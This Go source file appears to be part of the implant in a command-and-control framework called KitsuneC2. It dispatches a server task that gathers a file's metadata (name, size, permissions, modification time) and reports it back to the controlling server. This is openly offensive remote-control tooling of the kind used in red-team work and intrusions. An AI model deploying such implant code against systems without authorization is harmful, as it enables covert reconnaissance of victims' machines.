package main

import (
	"KitsuneC2/implant/modules"
	"KitsuneC2/lib/communication"
	"net"
)

var MessageTypeToFunc = map[int]func(net.Conn, interface{}){
	//reserved for implant functionality
	11: handleFileInfoReq,
}

func handleFileInfoReq(conn net.Conn, arguments interface{}) {
	fileInfoReq, ok := arguments.(*communication.FileInfoReq)
	if !ok {
		return
	}
	results, err := modules.FileInfo(fileInfoReq.PathToFile)
	if err != nil {
		SendErrorToServer(conn, fileInfoReq.TaskId, err)
	} else {
		resp := communication.FileInfoResp{TaskId: fileInfoReq.TaskId, Name: results.Name(), Size: results.Size(), Mode: results.Mode().String(), ModTime: int(results.ModTime().Unix()), IsDir: results.IsDir()}
		SendEnvelopeToServer(conn, 12, resp)
	}
}
